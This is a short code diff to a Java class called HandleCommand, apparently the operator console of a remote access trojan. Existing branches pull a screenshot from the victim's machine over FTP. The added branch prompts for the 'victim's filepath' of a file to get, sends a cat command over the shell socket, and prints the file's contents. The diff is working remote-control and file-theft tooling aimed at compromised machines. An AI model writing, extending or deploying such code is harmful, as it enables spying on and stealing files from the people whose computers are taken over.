@@ -72,6 +72,11 @@ public class HandleCommand {
 			System.out.println("Receiving screenshot to '" + System.getProperty("user.dir") + "\\screenshot.png'...");
 			FTP.shell("screenshot.png", "rec");
 			System.out.println(getResp());
+		} else if (command.equals("cat")) {
+			System.out.println("Enter victim's filepath of file to get:");
+			String file = SocketShell.getInput("");
+			Shell.out.println("cat " + file);
+			System.out.println(getResp());
 		} else if (command.equals("exit"))
 			System.exit(0);
 		else {
